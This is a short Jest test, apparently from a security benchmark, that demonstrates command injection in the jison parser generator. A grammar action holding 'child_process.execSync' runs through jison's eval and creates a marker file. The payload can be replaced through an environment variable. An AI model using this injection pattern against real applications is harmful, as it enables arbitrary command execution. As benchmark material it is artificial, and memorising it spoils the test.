test("Command Injection in jison", () => {
  expect.assertions(2);
  const jison = require("jison");
  const fs = require("fs");
  const path = "./jison";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  // jison embeds a grammar's semantic action into the generated parser (lib/jison.js:259) and turns it
  // into code with eval (lib/jison.js:1327). A caller that feeds an attacker-controlled action gets
  // command execution. Harmless payload: the action runs a shell command that creates a marker file.
  const action =
    process.env.SECBENCH_PAYLOAD ||
    ('require(`child_process`).execSync(`touch jison`);');
  const grammar = {
    lex: { rules: [["a", "return 'A';"], ["$", "return 'EOF';"]] },
    bnf: { start: [["A EOF", action]] },
  };
  try {
    const parser = new jison.Parser(grammar);
    parser.parse("a");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
